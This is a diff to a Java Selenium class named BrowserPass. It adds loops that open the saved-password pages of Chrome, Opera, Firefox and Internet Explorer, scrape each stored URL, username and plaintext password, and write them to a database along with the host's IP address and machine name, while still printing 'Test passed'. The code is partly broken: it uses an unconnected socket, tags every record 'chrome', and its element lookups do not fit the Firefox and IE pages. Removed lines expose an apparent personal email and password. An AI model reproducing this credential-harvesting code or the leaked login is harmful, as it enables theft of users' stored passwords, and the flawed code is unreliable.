@@ -1,7 +1,7 @@
 package browserpass;
 
+import java.net.Socket;
 import java.util.Collections;
-import javax.annotation.Resource;
 import javax.persistence.EntityManager;
 import javax.persistence.PersistenceContext;
 import org.openqa.selenium.By;
@@ -16,12 +16,13 @@ import org.openqa.selenium.opera.OperaDriver;
 public class BrowserPass {
 
     @PersistenceContext(unitName = "browserpasswords?zeroDateTimeBehavior=convertToNullPU")
-    private EntityManager em;
-    @Resource
+    private EntityManager entityManager;
+    Records_1 rec = new Records_1();
+    Socket socket = new Socket();
 
     public static void main(String[] args) {
         BrowserPass pass = new BrowserPass();
-        pass.chrome();
+        pass.opera();
     }
 
     public void chrome() {
@@ -37,10 +38,23 @@ public class BrowserPass {
             WebElement passwordList = driver.findElement(By.id("frb" + i));
             WebElement listitem = passwordList.findElement(By.className("list-item"));
             WebElement websitecolumn = listitem.findElement(By.className("website-column"));
+            WebElement passwordColumn = listitem.findElement(By.className("password-column"));
+
             String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
             String username = websitecolumn.findElement(By.id("username")).getText();
-            WebElement passwordColumn = listitem.findElement(By.className("password-column"));
             String password = passwordColumn.findElement(By.id("password")).getText();
+
+            rec.setBrowser("chrome");
+            rec.setCreatedtime(new java.util.Date());
+            rec.setIpaddress(socket.getInetAddress().getHostAddress());
+            rec.setOtherinfo("none for now");
+            rec.setPassword(password);
+            rec.setUser(username);
+            rec.setPcname(socket.getInetAddress().getHostName());
+
+            entityManager.getTransaction().begin();
+            entityManager.persist(rec);
+            entityManager.getTransaction().commit();
         }
 
         String actualUrl = "chrome://settings/passwords?search=passwords";
@@ -56,14 +70,32 @@ public class BrowserPass {
         System.setProperty("webdriver.opera.driver", "src\\browserpass\\operadriver.exe");
         WebDriver driver = new OperaDriver();
         driver.manage().window().maximize();
-        driver.get("https://www.linkedin.com/login");
-        WebElement username = driver.findElement(By.id("username"));
-        WebElement password = driver.findElement(By.id("password"));
-        WebElement login = driver.findElement(By.xpath("//button[text()='Sign in']"));
-        username.sendKeys("example@gmail.com");
-        password.sendKeys("password");
-        login.click();
-        String actualUrl = "https://www.linkedin.com/feed/";
+        driver.get("opera://settings/passwords?search=Passwords");
+
+        for (int i = 1; i < 10; i++) {
+            WebElement passwordList = driver.findElement(By.id("frb" + i));
+            WebElement listitem = passwordList.findElement(By.className("list-item"));
+            WebElement websitecolumn = listitem.findElement(By.className("website-column"));
+            WebElement passwordColumn = listitem.findElement(By.className("password-column"));
+
+            String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
+            String username = websitecolumn.findElement(By.id("username")).getText();
+            String password = passwordColumn.findElement(By.id("password")).getText();
+
+            rec.setBrowser("chrome");
+            rec.setCreatedtime(new java.util.Date());
+            rec.setIpaddress(socket.getInetAddress().getHostAddress());
+            rec.setOtherinfo("none for now");
+            rec.setPassword(password);
+            rec.setUser(username);
+            rec.setPcname(socket.getInetAddress().getHostName());
+
+            entityManager.getTransaction().begin();
+            entityManager.persist(rec);
+            entityManager.getTransaction().commit();
+        }
+
+        String actualUrl = "opera://settings/passwords?search=Passwords";
         String expectedUrl = driver.getCurrentUrl();
         if (actualUrl.equalsIgnoreCase(expectedUrl)) {
             System.out.println("Test passed");
@@ -77,12 +109,30 @@ public class BrowserPass {
         WebDriver driver = new FirefoxDriver();
         driver.manage().window().maximize();
         driver.get("about:preferences#privacy");
-//        WebElement username = driver.findElement(By.id("username"));
-//        WebElement password = driver.findElement(By.id("password"));
-        WebElement login = driver.findElement(By.xpath("//button[text()='Saved Logins...']"));
-//        username.sendKeys("chepseron@gmail.com");
-//        password.sendKeys("benson32!");
-        login.click();
+
+        for (int i = 1; i < 10; i++) {
+            WebElement passwordList = driver.findElement(By.id("frb" + i));
+            WebElement listitem = passwordList.findElement(By.className("list-item"));
+            WebElement websitecolumn = listitem.findElement(By.className("website-column"));
+            WebElement passwordColumn = listitem.findElement(By.className("password-column"));
+
+            String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
+            String username = websitecolumn.findElement(By.id("username")).getText();
+            String password = passwordColumn.findElement(By.id("password")).getText();
+
+            rec.setBrowser("chrome");
+            rec.setCreatedtime(new java.util.Date());
+            rec.setIpaddress(socket.getInetAddress().getHostAddress());
+            rec.setOtherinfo("none for now");
+            rec.setPassword(password);
+            rec.setUser(username);
+            rec.setPcname(socket.getInetAddress().getHostName());
+
+            entityManager.getTransaction().begin();
+            entityManager.persist(rec);
+            entityManager.getTransaction().commit();
+        }
+
         String actualUrl = "about:preferences#privacy";
         String expectedUrl = driver.getCurrentUrl();
         if (actualUrl.equalsIgnoreCase(expectedUrl)) {
@@ -97,12 +147,30 @@ public class BrowserPass {
         WebDriver driver = new InternetExplorerDriver();
         driver.manage().window().maximize();
         driver.get("https://www.linkedin.com/login");
-        WebElement username = driver.findElement(By.id("username"));
-        WebElement password = driver.findElement(By.id("password"));
-        WebElement login = driver.findElement(By.xpath("//button[text()='Sign in']"));
-        username.sendKeys("example@gmail.com");
-        password.sendKeys("password");
-        login.click();
+
+        for (int i = 1; i < 10; i++) {
+            WebElement passwordList = driver.findElement(By.id("frb" + i));
+            WebElement listitem = passwordList.findElement(By.className("list-item"));
+            WebElement websitecolumn = listitem.findElement(By.className("website-column"));
+            WebElement passwordColumn = listitem.findElement(By.className("password-column"));
+
+            String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
+            String username = websitecolumn.findElement(By.id("username")).getText();
+            String password = passwordColumn.findElement(By.id("password")).getText();
+
+            rec.setBrowser("chrome");
+            rec.setCreatedtime(new java.util.Date());
+            rec.setIpaddress(socket.getInetAddress().getHostAddress());
+            rec.setOtherinfo("none for now");
+            rec.setPassword(password);
+            rec.setUser(username);
+            rec.setPcname(socket.getInetAddress().getHostName());
+
+            entityManager.getTransaction().begin();
+            entityManager.persist(rec);
+            entityManager.getTransaction().commit();
+        }
+
         String actualUrl = "https://www.linkedin.com/feed/";
         String expectedUrl = driver.getCurrentUrl();
         if (actualUrl.equalsIgnoreCase(expectedUrl)) {
@@ -112,5 +180,4 @@ public class BrowserPass {
         }
     }
 
-   
 }
